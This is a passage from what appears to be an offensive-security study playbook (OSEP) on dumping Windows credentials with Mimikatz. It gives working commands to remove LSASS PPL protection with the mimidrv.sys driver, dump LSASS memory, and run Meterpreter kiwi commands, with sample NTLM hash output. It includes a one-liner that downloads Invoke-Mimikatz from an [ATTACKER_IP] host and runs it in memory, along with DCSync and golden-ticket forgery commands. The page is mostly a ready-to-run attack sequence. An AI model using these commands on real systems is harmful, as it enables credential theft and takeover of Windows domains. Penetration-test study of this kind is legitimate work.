<p>Mimikatz includes <strong>mimidrv.sys</strong>, a signed driver that can be loaded (requires <strong>Admin/SYSTEM</strong> + <code>SeLoadDriverPrivilege</code>) to bypass PPL and access LSASS memory.</p>
<p><strong>Simple Extracting Credentials</strong></p>
<div class="language-powershell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-powershell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># We must have SYSTEM or local administrator permissions</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">mimikatz</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">exe</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">mimikatz </span><span class="token comment" style="color:#999988;font-style:italic"># privilege::debug</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">mimikatz </span><span class="token comment" style="color:#999988;font-style:italic"># sekurlsa::logonpasswords</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre></div></div>
<p><strong>Steps to Bypass LSA</strong></p>
<ol>
<li class="">Check if LSA Protecting is enabled</li>
</ol>
<div class="language-powershell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-powershell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># 0=disabled, 1=enabled</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa </span><span class="token operator" style="color:#393A34">/</span><span class="token plain">v RunAsPPL</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre></div></div>
<ol>
<li class=""><strong>Load the <code>mimidrv.sys</code> driver</strong></li>
</ol>
<div class="language-powershell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-powershell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">mimikatz </span><span class="token comment" style="color:#999988;font-style:italic"># !+</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre></div></div>
<ol>
<li class=""><strong>Disable the PPL Protection for LSASS</strong></li>
</ol>
<div class="language-powershell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-powershell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">mimikatz </span><span class="token comment" style="color:#999988;font-style:italic"># !processprotect /process:lsass.exe /remove</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">Process</span><span class="token plain"> : lsass</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">exe</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">PID 536 </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">&gt; 00/00 </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">0-0-0</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre></div></div>
<ol>
<li class=""><strong>Extract the Credentials</strong></li>
</ol>
<div class="language-powershell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-powershell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">mimikatz </span><span class="token comment" style="color:#999988;font-style:italic"># sekurlsa::logonpasswords</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="minidump"><strong>MiniDump</strong><a href="#minidump" class="hash-link" aria-label="Direct link to minidump" title="Direct link to minidump" translate="no">​</a></h3>
<ol>
<li class="">
<p><strong>Compile the MiniDump project</strong>, <a href="https://github.com/chvancooten/OSEP-Code-Snippets/tree/main/MiniDump" target="_blank" rel="noopener noreferrer" class="">GitHub Reference</a>, alternative you can use Task Manager if have a GUI to dump this file.</p>
<p>Create MiniDump</p>
<p><img decoding="async" loading="lazy" src="https://www.emmanuelsolis.com/img/14.3.2_minidump.png" alt="Create MiniDump" class="img_ev3q"></p>
</li>
<li class="">
<p><strong>Run the tool</strong></p>
</li>
</ol>
<div class="language-powershell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-powershell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">MiniDump</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">exe</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre></div></div>
<ol>
<li class=""><strong>Run Mimikatz</strong></li>
</ol>
<div class="language-powershell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-powershell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">mimikatz</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">exe</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># lsass.dmp is the dumped file from the previous step</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">mimikatz </span><span class="token comment" style="color:#999988;font-style:italic"># sekurlsa::minidump lsass.dmp</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre></div></div>
<ol>
<li class=""><strong>Extract the credentials</strong></li>
</ol>
<div class="language-powershell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-powershell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">mimikatz </span><span class="token comment" style="color:#999988;font-style:italic"># sekurlsa::logonpasswords</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="kiwi-meterpreter-built-in-module"><strong>Kiwi Meterpreter Built In Module</strong><a href="#kiwi-meterpreter-built-in-module" class="hash-link" aria-label="Direct link to kiwi-meterpreter-built-in-module" title="Direct link to kiwi-meterpreter-built-in-module" translate="no">​</a></h3>
<p><strong>Steps</strong></p>
<ol>
<li class=""><strong>Load the module</strong> in a current Meterpreter session</li>
</ol>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter </span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> load kiwi</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Loading extension kiwi</span><span class="token punctuation" style="color:#393A34">..</span><span class="token plain">.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token builtin class-name">.</span><span class="token comment" style="color:#999988;font-style:italic">#####.   mimikatz 2.2.0 20191125 (x64/windows)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><span class="token builtin class-name">.</span><span class="token comment" style="color:#999988;font-style:italic">## ^ ##.  &quot;A La Vie, A L&#x27;Amour&quot; - (oe.eo)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">## \ / ##       &gt; http://blog.gentilkiwi.com/mimikatz</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;## v ##&#x27;</span><span class="token plain">        Vincent LE TOUX            </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain"> vincent.letoux@gmail.com </span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token string" style="color:#e3116c">&#x27;#####&#x27;</span><span class="token plain">         </span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> http://pingcastle.com / http://mysmartlogon.com  ***/</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Success.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre></div></div>
<ol>
<li class=""><strong>(Optional)</strong> Check the current available options</li>
</ol>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter </span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> </span><span class="token builtin class-name">help</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">..</span><span class="token plain">.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Kiwi Commands</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token operator" style="color:#393A34">==</span><span class="token operator" style="color:#393A34">==</span><span class="token operator" style="color:#393A34">==</span><span class="token operator" style="color:#393A34">==</span><span class="token operator" style="color:#393A34">==</span><span class="token operator" style="color:#393A34">==</span><span class="token operator" style="color:#393A34">=</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Command                Description</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    -------                -----------</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    creds_all              Retrieve all credentials </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">parsed</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    creds_kerberos         Retrieve Kerberos creds </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">parsed</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    creds_livessp          Retrieve Live SSP creds</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    creds_msv              Retrieve LM/NTLM creds </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">parsed</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    creds_ssp              Retrieve SSP creds</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    creds_tspkg            Retrieve TsPkg creds </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">parsed</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    creds_wdigest          Retrieve WDigest creds </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">parsed</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    dcsync                 Retrieve user account information via DCSync </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">unparsed</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    dcsync_ntlm            Retrieve user account NTLM hash, SID and RID via DCSync</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    golden_ticket_create   Create a golden kerberos ticket</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    kerberos_ticket_list   List all kerberos tickets </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">unparsed</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    kerberos_ticket_purge  Purge any in-use kerberos tickets</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    kerberos_ticket_use    Use a kerberos ticket</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    kiwi_cmd               Execute an arbitary mimikatz </span><span class="token builtin class-name">command</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">unparsed</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    lsa_dump_sam           Dump LSA SAM </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">unparsed</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    lsa_dump_secrets       Dump LSA secrets </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">unparsed</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    password_change        Change the password/hash of a user</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    wifi_list              List wifi profiles/creds </span><span class="token keyword" style="color:#00009f">for</span><span class="token plain"> the current user</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    wifi_list_shared       List shared wifi profiles/creds </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">requires SYSTEM</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre></div></div>
<ol>
<li class=""><strong>Extract Credentials</strong></li>
</ol>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter </span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> creds_msv</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">+</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> Running as SYSTEM</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">*</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> Retrieving msv credentials</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">msv credentials</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token operator" style="color:#393A34">==</span><span class="token operator" style="color:#393A34">==</span><span class="token operator" style="color:#393A34">==</span><span class="token operator" style="color:#393A34">==</span><span class="token operator" style="color:#393A34">==</span><span class="token operator" style="color:#393A34">==</span><span class="token operator" style="color:#393A34">==</span><span class="token operator" style="color:#393A34">=</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Username  Domain  NTLM                              SHA1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">--------  ------  ----                              ----</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">luiza     ITWK01  167cf9218719a1209efcfb4bce486a18  2f92bb5c2a2526a630122ea1b642c46193a0d837</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">..</span><span class="token punctuation" style="color:#393A34">..</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="invoke-mimikatz"><strong>Invoke-Mimikatz</strong><a href="#invoke-mimikatz" class="hash-link" aria-label="Direct link to invoke-mimikatz" title="Direct link to invoke-mimikatz" translate="no">​</a></h3>
<p><strong>Steps</strong></p>
<ol>
<li class="">Download the code from <a href="https://github.com/Extravenger/OSEPlayground/tree/main/10%20-%20Post%20Exploitation/Mimikatz" target="_blank" rel="noopener noreferrer" class="">GitHub</a></li>
<li class="">Start an HTTP Server</li>
</ol>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">python3 </span><span class="token parameter variable" style="color:#36acaa">-m</span><span class="token plain"> http.server </span><span class="token number" style="color:#36acaa">80</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre></div></div>
<ol>
<li class=""><strong>Download it to the victim and load it directly in memory</strong></li>
</ol>
<div class="language-powershell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-powershell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token function" style="color:#d73a49">iex</span><span class="token punctuation" style="color:#393A34">(</span><span class="token function" style="color:#d73a49">New-Object</span><span class="token plain"> net</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">webclient</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">downloadstring</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&#x27;http://[ATTACKER_IP]/Invoke-Mimikatz.ps1&#x27;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre></div></div>
<p><strong>Disable PPL</strong></p>
<div class="language-powershell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-powershell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token function" style="color:#d73a49">Invoke-Mimikatz</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">Command </span><span class="token string" style="color:#e3116c">&#x27;&quot;!processprotect /process:lsass.exe /remove&quot;&#x27;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre></div></div>
<p><strong>All-In-One Command</strong></p>
<div class="language-powershell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-powershell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token function" style="color:#d73a49">Invoke-Mimikatz</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">Command </span><span class="token string" style="color:#e3116c">&#x27;&quot;privilege::debug&quot; &quot;token::elevate&quot; &quot;vault::cred /patch&quot; &quot;lsadump::sam&quot; &quot;sekurlsa::credman&quot; &quot;sekurlsa::ssp&quot; &quot;sekurlsa::wdigest&quot; &quot;sekurlsa::logonpasswords&quot; &quot;lsadump::secrets&quot;&#x27;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre></div></div>
<p><strong>Command by Command</strong></p>
<div class="language-powershell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-powershell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># Get passwords of scheduled tasks.</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">Invoke-Mimikatz</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">Command </span><span class="token string" style="color:#e3116c">&#x27;&quot;privilege::debug&quot; &quot;token::elevate&quot; &quot;vault::cred /patch&quot;&#x27;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Dump logged-on Accounts hashes.</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">Invoke-Mimikatz</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">Command </span><span class="token string" style="color:#e3116c">&#x27;&quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords&quot;&#x27;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Local Accounts Credentials</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">Invoke-Mimikatz</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">Command </span><span class="token string" style="color:#e3116c">&#x27;&quot;privilege::debug&quot; &quot;token::elevate&quot; &quot;lsadump::sam&quot;&#x27;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Dump LSA secrets</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">Invoke-Mimikatz</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">Command </span><span class="token string" style="color:#e3116c">&#x27;&quot;privilege::debug&quot; &quot;token::elevate&quot; &quot;lsadump::secrets&quot;&#x27;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># List Kerberos encryption keys</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">Invoke-Mimikatz</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">Command </span><span class="token string" style="color:#e3116c">&#x27;&quot;privilege::debug&quot; sekurlsa::ekeys&quot;&#x27;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># List Credentials Manager</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">Invoke-Mimikatz</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">Command </span><span class="token string" style="color:#e3116c">&#x27;&quot;privilege::debug&quot; &quot;sekurlsa::credman&quot;&#x27;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Lists SSP credentials</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">Invoke-Mimikatz</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">Command </span><span class="token string" style="color:#e3116c">&#x27;&quot;privilege::debug&quot; &quot;sekurlsa::ssp&quot;&#x27;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># List WDigest credentials</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">Invoke-Mimikatz</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">Command </span><span class="token string" style="color:#e3116c">&#x27;&quot;privilege::debug&quot; &quot;sekurlsa::wdigest&quot;&#x27;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre></div></div>
<p><strong>DCSync</strong></p>
<div class="language-powershell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-powershell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># Sometimes DC need to be specified too with: /dc:[DOMAIN].com</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">Invoke-Mimikatz</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">Command </span><span class="token string" style="color:#e3116c">&#x27;&quot;lsadump::dcsync /user:NETBIOS\[USER]&quot;&#x27;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre></div></div>
<p><strong>Golden Ticket</strong></p>
<div class="language-powershell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-powershell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token function" style="color:#d73a49">Invoke-Mimikatz</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">Command </span><span class="token string" style="color:#e3116c">&#x27;&quot;kerberos::golden /user:Administrator /domain:[domain.com] /sid:[domainSID] /krbtgt:[KRBTGTHash] /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt&quot;&#x27;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre></div></div></div></article><nav class="docusaurus-mt-lg pagination-nav" aria-label="Docs pages"><a class="pagination-nav__link pagination-nav__link--prev" href="/OSEP-Playbook/docs/osep/Credentials/Cracking Hashes"><div class="pagination-nav__sublabel">Previous</div><div class="pagination-nav__label">Cracking Hashes</div></a><a class="pagination-nav__link pagination-nav__link--next" href="/OSEP-Playbook/docs/osep/Credentials/Pass-The-Hash"><div class="pagination-nav__sublabel">Next</div><div class="pagination-nav__label">Pass-The-Hash</div></a></nav></div></div><div class="col col--3"><div class="tableOfContents_bqdL thin-scrollbar theme-doc-toc-desktop"><ul class="table-of-contents table-of-contents__left-border"><li><a href="#mimikatz" class="table-of-contents__link toc-highlight"><strong>Mimikatz</strong></a></li><li><a href="#commands-without-credentials" class="table-of-contents__link toc-highlight"><strong>Commands Without Credentials</strong></a></li><li><a href="#commands-that-required-credentials" class="table-of-contents__link toc-highlight"><strong>Commands That Required Credentials</strong></a></li><li><a href="#command-one-liners" class="table-of-contents__link toc-highlight"><strong>Command One-Liners</strong></a></li><li><a href="#lsa-protection-bypass" class="table-of-contents__link 